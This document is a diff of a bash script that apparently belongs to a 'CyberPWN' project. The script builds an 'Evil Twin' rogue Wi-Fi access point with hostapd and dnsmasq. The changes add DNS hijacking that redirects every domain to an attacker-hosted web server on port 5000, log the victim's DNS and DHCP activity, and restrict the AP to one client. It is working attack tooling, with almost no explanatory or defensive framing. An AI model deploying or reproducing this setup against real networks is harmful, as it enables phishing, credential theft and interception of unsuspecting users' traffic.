@@ -1,11 +1,11 @@
 #!/bin/bash
 # Start Evil Twin AP: release wlan0 from NM, set 192.168.4.1, hostapd + dnsmasq.
-# Usage: sudo ./PORTABLEAP.sh <SSID>
-# When AP is up, open http://192.168.4.1:5000 from any device connected to the AP.
+# Usage: sudo ./PORTABLEAP.sh
+# Hosts website at 192.168.4.1:5000 with DNS, single client limit
 
 set -e
-SSID="${1:-CPWN}"
-AP_PASS="062823"
+SSID="PWN"
+AP_PASS="pwn123"
 # Project root (parent of scripts/)
 BASE="$(cd "$(dirname "$0")/.." && pwd)"
 CONFIG="$BASE/evil_twin.conf"
@@ -13,8 +13,8 @@ AP_IFACE="wlan0"  # Fixed to wlan0 for AP
 SCAN_IFACE="wlan1"  # Use wlan1 for scanning
 AP_IP="192.168.4.1"
 AP_NET="192.168.4.0/24"
-DHCP_START="192.168.4.10"
-DHCP_END="192.168.4.50"
+DHCP_START="192.168.4.100"
+DHCP_END="192.168.4.100"  # Single client - only one IP
 DNSMASQ_CONF="/tmp/cyberpwn_dnsmasq_${AP_IFACE}.conf"
 HOSTAPD_PID="/tmp/cyberpwn_hostapd.pid"
 
@@ -26,8 +26,10 @@ fi
 
 echo "Using AP interface: $AP_IFACE"
 echo "Scan interface available: $SCAN_IFACE"
+echo "SSID: $SSID (single client allowed)"
+echo "Website will be hosted at: http://$AP_IP:5000"
 
-# 1) Write hostapd config
+# 1) Write hostapd config with single client limit
 cat > "$CONFIG" << EOF
 # Evil Twin AP - $SSID
 interface=$AP_IFACE
@@ -35,6 +37,7 @@ driver=nl80211
 ssid=$SSID
 channel=6
 hw_mode=g
+max_num_sta=1  # Single client limit
 EOF
 
 cat >> "$CONFIG" << EOF
@@ -53,12 +56,22 @@ ip addr add "$AP_IP/24" dev "$AP_IFACE"
 ip link set "$AP_IFACE" up
 sleep 1
 
-# 3) dnsmasq for DHCP (clients get 192.168.4.x, gateway 192.168.4.1)
+# 3) dnsmasq for DHCP (single client) and DNS
 cat > "$DNSMASQ_CONF" << EOF
 interface=$AP_IFACE
 bind-interfaces
 dhcp-range=${DHCP_START},${DHCP_END},255.255.255.0,12h
 dhcp-option=3,$AP_IP
+dhcp-option=6,$AP_IP
+# DNS hijacking - redirect all domains to our web server
+address=/#/$AP_IP
+# DNS server settings
+server=8.8.8.8
+domain-needed
+bogus-priv
+# Log DNS queries for monitoring
+log-queries
+log-dhcp
 EOF
 pkill -f "dnsmasq.*$DNSMASQ_CONF" 2>/dev/null || true
 dnsmasq -C "$DNSMASQ_CONF" -q 2>/dev/null &
@@ -68,5 +81,14 @@ pkill -f "hostapd.*$CONFIG" 2>/dev/null || true
 sleep 1
 hostapd -B -P "$HOSTAPD_PID" "$CONFIG" 2>/dev/null || hostapd -B "$CONFIG"
 
-echo "AP up on $AP_IFACE: SSID=$SSID (WPA2), open http://${AP_IP}:5000"
+echo ""
+echo "=== AP SETUP COMPLETE ==="
+echo "SSID: $SSID (WPA2)"
+echo "Password: $AP_PASS"
+echo "AP IP: $AP_IP"
+echo "Website: http://$AP_IP:5000"
+echo "Max clients: 1 (single connection)"
+echo "DNS: All domains redirect to $AP_IP"
+echo ""
+echo "Client will be redirected to your CyberPWN website!"
 echo "Use $SCAN_IFACE for network scanning"
